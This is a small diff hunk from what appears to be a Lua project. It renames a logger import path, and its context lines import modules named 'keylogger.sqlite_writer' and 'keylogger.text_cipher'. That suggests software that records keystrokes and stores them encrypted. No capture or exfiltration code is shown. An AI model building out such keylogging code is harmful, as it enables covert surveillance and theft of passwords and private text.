@@ -37,7 +37,7 @@
 
 local M = {}
 
-local Logger       = require("lib.logger")
+local Logger       = require("infra.logger")
 local Scheduler    = require("adapters.timer_scheduler")
 local SqliteWriter = require("modules.keylogger.sqlite_writer")
 local TextCipher   = require("modules.keylogger.text_cipher")
